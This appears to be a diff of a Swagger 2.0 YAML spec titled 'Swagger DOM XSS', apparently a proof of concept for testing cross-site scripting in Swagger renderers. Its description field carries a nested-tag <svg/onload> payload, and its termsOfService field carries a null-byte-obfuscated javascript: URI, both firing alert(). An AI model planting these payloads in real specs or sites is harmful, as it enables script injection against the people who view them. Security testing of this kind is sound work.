@@ -1,8 +1,10 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <math><mtext><option><textarea><svg/onload=alert(1)>
-  termsOfService: "//gg.com"
+  description: |
+    <math><mtext><option><textarea><svg/onload=alert(1)>
+    
+  termsOfService: "Java%00script:alert()"
   version: production
 basePath: /JSSResource/
 produces:
